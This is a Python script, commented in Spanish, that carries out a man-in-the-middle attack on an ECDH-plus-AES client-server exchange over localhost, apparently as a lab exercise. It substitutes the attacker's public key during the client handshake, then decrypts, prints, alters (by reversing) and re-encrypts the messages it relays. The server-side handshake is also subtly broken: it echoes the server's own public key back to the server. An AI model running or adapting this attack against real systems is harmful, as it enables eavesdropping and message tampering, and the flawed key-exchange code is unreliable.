import socket
from Crypto.PublicKey import ECC
from functions import (
    decrypt_message,
    derive_symmetric_key,
    ecdh_shared_secret,
    encrypt_message,
    generate_ecc_keys,
)

PORT_CLIENT = 1234  # Puerto en el que el cliente cree que está el servidor
PORT_SERVER = 4321  # Puerto del servidor real
SERVER_IP = "127.0.0.1"  # IP del servidor y del atacante

HEADER_SIZE = 64
ENCODING_FORMAT = 'utf-8' 
AES_BLOCK_SIZE = 16  # Tamaño del bloque para AES

# Función para manejar el ataque MitM
def mitm_attack():
    print("[👺] Esperando conexión del cliente...")
    client_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_listener.bind((SERVER_IP, PORT_CLIENT))  
    client_listener.listen(1)
    
    client_conn, client_addr = client_listener.accept()  # Conectar con el cliente
    print(f"[👺] Cliente conectado desde: {client_addr}")

    # Conectar al servidor real
    print("[👺] Estableciendo conexión con el servidor real...")
    server_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_conn.connect((SERVER_IP, PORT_SERVER))  # Conectar al servidor real

    # Intercambio de claves con el cliente
    print("[👺] Realizando intercambio de claves con el cliente...")
    attacker_private_key, attacker_public_key = generate_ecc_keys()

    # Recibir la clave pública del cliente
    client_pub_key_len = int(client_conn.recv(HEADER_SIZE).decode(ENCODING_FORMAT))
    client_pub_key_bytes = client_conn.recv(client_pub_key_len)
    client_public_key = ECC.import_key(client_pub_key_bytes)

    # Enviar clave pública falsa del atacante al cliente
    attacker_pub_key_bytes = attacker_public_key.export_key(format='DER')
    client_conn.send(str(len(attacker_pub_key_bytes)).encode(ENCODING_FORMAT).ljust(HEADER_SIZE))
    client_conn.send(attacker_pub_key_bytes)

    # Intercambio de claves con el servidor
    print("[👺] Realizando intercambio de claves con el servidor...")
    server_private_key, server_public_key = generate_ecc_keys()

    # Recibir la clave pública del servidor
    server_pub_key_len = int(server_conn.recv(HEADER_SIZE).decode(ENCODING_FORMAT))
    server_pub_key_bytes = server_conn.recv(server_pub_key_len)
    server_public_key = ECC.import_key(server_pub_key_bytes)

    # Enviar clave pública falsa del atacante al servidor
    server_pub_key_bytes = server_public_key.export_key(format='DER')
    server_conn.send(str(len(server_pub_key_bytes)).encode(ENCODING_FORMAT).ljust(HEADER_SIZE))
    server_conn.send(server_pub_key_bytes)

    # Generar secretos compartidos (ECDH manual)
    shared_secret_client = ecdh_shared_secret(attacker_private_key, client_public_key)
    shared_secret_server = ecdh_shared_secret(server_private_key, server_public_key)

    # Derivar claves AES para cliente y servidor
    derived_key_client = derive_symmetric_key(str(shared_secret_client).encode())
    derived_key_server = derive_symmetric_key(str(shared_secret_server).encode())

    print("[👺] Secretos compartidos y claves derivadas generadas exitosamente.")

    # Comenzar la interceptación de mensajes
    while True:
        try:
            # Recibir mensaje del cliente
            msg_len = client_conn.recv(HEADER_SIZE).decode(ENCODING_FORMAT)
            if msg_len:
                msg_len = int(msg_len)
                encrypted_msg_from_client = client_conn.recv(msg_len)

                # Descifrar mensaje del cliente
                decrypted_msg = decrypt_message(derived_key_client, encrypted_msg_from_client).decode(ENCODING_FORMAT)
                print(f"[👺] Mensaje interceptado del cliente: {decrypted_msg}")

                # Invertir la cadena del mensaje
                decrypted_msg = decrypted_msg[::-1]

                # Cifrar el mensaje modificado o el original con la clave del servidor
                encrypted_msg_to_server = encrypt_message(derived_key_server, decrypted_msg.encode(ENCODING_FORMAT))

                # Enviar el mensaje cifrado al servidor
                send_len = str(len(encrypted_msg_to_server)).encode(ENCODING_FORMAT)
                send_len += b' ' * (HEADER_SIZE - len(send_len))
                server_conn.send(send_len)
                server_conn.send(encrypted_msg_to_server)

            # Recibir respuesta del servidor
            msg_len = server_conn.recv(HEADER_SIZE).decode(ENCODING_FORMAT)
            if msg_len:
                msg_len = int(msg_len)
                encrypted_msg_from_server = server_conn.recv(msg_len)

                # Descifrar mensaje del servidor
                decrypted_msg = decrypt_message(derived_key_server, encrypted_msg_from_server).decode(ENCODING_FORMAT)
                print(f"[👺] Mensaje interceptado del servidor: {decrypted_msg}")

                # Cifrar el mensaje original con la clave del cliente
                encrypted_msg_to_client = encrypt_message(derived_key_client, decrypted_msg.encode(ENCODING_FORMAT))

                # Enviar el mensaje cifrado al cliente
                send_len = str(len(encrypted_msg_to_client)).encode(ENCODING_FORMAT)
                send_len += b' ' * (HEADER_SIZE - len(send_len))
                client_conn.send(send_len)
                client_conn.send(encrypted_msg_to_client)

        except Exception as e:
            print(f"[👺] Se ha producido un error: {str(e)}")
            client_conn.close()
            server_conn.close()
            break

if __name__ == "__main__":
    print("[👺] Iniciando ataque de Hombre en el Medio...")
    mitm_attack()